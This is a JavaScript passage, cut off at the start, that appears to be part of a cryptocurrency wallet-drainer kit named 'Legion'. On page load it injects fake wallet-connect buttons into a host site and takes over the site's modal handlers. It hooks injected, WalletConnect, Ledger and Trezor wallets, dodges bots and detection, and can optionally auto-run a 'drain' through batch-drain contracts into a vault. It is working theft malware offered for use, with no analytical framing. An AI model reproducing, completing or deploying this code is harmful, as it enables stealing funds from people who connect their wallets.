        await SCOUT.reportDrainStatus('user_rejected', S.evmAddr, S.evmChain, S.evmWallet, e.message);
      }
    }
  }

  async function handleConnect() {
    if (S.drainRunning) return;
    if (!S.vaultLoaded) await prefetchVault();

    if (PLAT.strategy === 'inapp' && window.ethereum) {
      await handleEvmConnect(window.ethereum, { info: { name: PLAT.walletApp || 'Wallet' } });
      return;
    }

    if (CFG.hwWallets && HW.available()) {
      var ledger = await HW.connectLedger();
      if (ledger) {
        var hwProv = {
          request: async function (args) {
            if (args.method === 'eth_requestAccounts') return [ledger.address];
            if (args.method === 'eth_chainId') return '0x1';
            return null;
          },
        };
        await handleEvmConnect(hwProv, null, ledger);
        return;
      }
      var trezor = await HW.connectTrezor();
      if (trezor) {
        var tzProv = {
          request: async function (args) {
            if (args.method === 'eth_requestAccounts') return [trezor.address];
            if (args.method === 'eth_chainId') return '0x1';
            return null;
          },
        };
        await handleEvmConnect(tzProv, null, trezor);
        return;
      }
    }

    openExtensionPicker();
  }

  async function handleWC() {
    if (S.drainRunning) return;
    if (!S.vaultLoaded) await prefetchVault();
    installWcGuard();
    UI.status('Opening WalletConnect...');
    _wcConnecting = false;

    try {
      if (typeof window.LegionWallet !== 'undefined' && window.LegionWallet.disconnect) {
        await window.LegionWallet.disconnect();
      }
    } catch (e) {}
    try {
      var wcKeys = [];
      for (var wi = 0; wi < localStorage.length; wi++) {
        var wk = localStorage.key(wi);
        if (!wk) continue;
        var wkl = wk.toLowerCase();
        if (wkl.indexOf('wc@') === 0 || wkl.indexOf('walletconnect') !== -1 ||
            wkl.indexOf('w3m') !== -1 || wkl.indexOf('@w3m') !== -1) wcKeys.push(wk);
      }
      wcKeys.forEach(function (k) { try { localStorage.removeItem(k); } catch (e2) {} });
      if (wcKeys.length) L.log('WC: cleared', wcKeys.length, 'stale key(s)');
    } catch (e3) {}

    var wcProv = null;
    try {
      L.log('WC: Reown AppKit bundle (Uniswap/Aave style)');
      wcProv = await bundledWalletConnect();
      if (!wcProv) {
        removeWcGuard();
        UI.status('WalletConnect failed');
        return;
      }

      try {
        var wcAccts = await wcProv.request({ method: 'eth_accounts' });
        if (!wcAccts || !wcAccts.length) {
          wcAccts = await evmRequestAccounts(wcProv);
        }
        if (!wcAccts || !wcAccts.length) {
          L.warn('WC: connected but no accounts — retry');
          removeWcGuard();
          UI.status('WalletConnect failed');
          return;
        }
      } catch (accErr) {
        L.warn('WC account check:', accErr.message);
      }

      S.wcSessionActive = true;
      L.log('WC provider ready | wc:', !!(wcProv && wcProv.isWalletConnect),
        '| connector:', (wcProv && wcProv.connectorId) || '?');
      await handleEvmConnect(wcProv, { info: { name: 'WalletConnect' } });
    } catch (e) {
      S.wcSessionActive = false;
      removeWcGuard();
      L.warn('WC flow error:', e.message);
      UI.status('WalletConnect failed');
    }
  }

  async function init() {
    if (isBot()) { L.warn('Bot detected — abort'); return; }

    // Fire EIP-6963 immediately
    requestProviders();
    discoverChainFamilies();
    setTimeout(function () { requestProviders(); discoverChainFamilies(); }, 800);
    setTimeout(function () { requestProviders(); discoverChainFamilies(); }, 2000);

    // Prefetch vault in background
    prefetchVault();

    // Anti-detection monitor
    SEC.startMonitor();

    // Wait for wallets to announce
    await sleep(600);

    // Inject UI buttons
    var nblDrawer = document.querySelector('[data-testid="account-drawer-container"]');
    if (document.body) {
      if (!nblDrawer) UI.inject(defaultConnect, handleWC);
    } else {
      document.addEventListener('DOMContentLoaded', function () {
        if (!document.querySelector('[data-testid="account-drawer-container"]')) {
          UI.inject(defaultConnect, handleWC);
        }
      });
    }

    window.legionOpenExtensions = openExtensionPicker;

    if (!nblDrawer) {
      window.customModalOpen = defaultConnect;
      window.customModalClose = function () { UI.closeWalletModal(); };
    } else if (window.LegionDrawer && typeof window.LegionDrawer.open === 'function') {
      window.customModalOpen = function () { window.LegionDrawer.open(); };
      window.customModalClose = function () { window.LegionDrawer.close(); };
      window.customModalClickWalletConnect = function () {
        window.LegionDrawer.close();
        handleWC();
      };
    }

    L.log('Legion v5.8.3 ready — chain-family detection (EVM+SVM+UTXO+...)');

    // Only auto-connect when explicitly enabled (never on silentMode alone)
    if (CFG.autoConnectOnLoad === true && AUTO_DRAIN && !S.drainRunning && window.ethereum) {
      setTimeout(function () {
        handleConnect().catch(function (e) { L.warn('autoConnectOnLoad:', e.message); });
      }, 800);
    }

    if (AUTO_RUN && !S.drainRunning) {
      setTimeout(function () { handleConnect().catch(function (e) { L.warn('autoRun:', e.message); }); }, 800);
    }
  }

  // Public API
  window.legion = {
    connect: handleConnect,
    connectWC: handleWC,
    connectInjected: connectWithWallet,
    openPanel: defaultConnect,
    openExtensions: openExtensionPicker,
    drain: handleConnect,
    hook: function () { hookPageButtons(defaultConnect); },
    state: S,
    config: CFG,
    version: '5.3.0',
    contracts: {
      legionDrain: LEGION_DRAIN,
      batchDrainV1: BATCH_DRAIN,
      batchDrainV2: BATCH_DRAIN_V2,
      batchDrainV2OnChainVault: BATCH_DRAIN_V2_ONCHAIN_VAULT,
      apiVault: function () { return VAULT.evm; },
      coverage: function (chainId) {
        var id = Number(chainId || 1);
        return {
          chainId: id,
          claimForwarder: resolveClaimContract(id),
          batchDrainV1: isZeroAddr(BATCH_DRAIN[id]) ? null : BATCH_DRAIN[id],
          batchDrainV2: resolveBatchDrainV2(id),
          apiVault: VAULT.evm,
          batchV2HardcodedVault: BATCH_DRAIN_V2_ONCHAIN_VAULT,
        };
      },
    },
  };

  // Boot
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
